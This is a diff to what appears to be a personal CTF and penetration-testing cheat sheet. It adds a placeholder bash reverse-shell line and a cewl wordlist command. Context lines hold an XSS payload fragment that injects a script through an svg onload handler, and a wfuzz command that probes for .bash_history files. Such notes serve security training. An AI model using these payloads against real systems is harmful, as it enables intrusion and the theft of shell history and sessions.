@@ -196,6 +196,9 @@ Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script"
 `wfuzz -u http://<ip>:<port>/<api-endpoint>\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404` <br/>
 Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_history` "?" is before the parameter and FUZZ is telling to find a parameter and we are looking for `.bash_hitory` as an example
 
+### Web Shell Bash
+`bash -c "<bash_rev_shell>"`
+
 # Wordlists
 
 ### Directory Bruteforcing
@@ -209,6 +212,12 @@ Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_his
 * /usr/share/wordlists/fasstrackt.txt
 * using `crackstation`
 * using `seclists`
+
+# Generating Worlists for directory brute force
+
+### Cewl 
+This spiders the given url and finding keyowrds then makes a wordlists through it's findings<br/>
+`cewl.rb <ip>`
 
 # King Of The Hill (KoTH)
 ### Monitoring and Closing Shell (Linux)
@@ -237,8 +246,6 @@ Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_his
 ### Closing Session (Windows)
 * quser
 * logoff id|user_name  
-
-
 
 
 
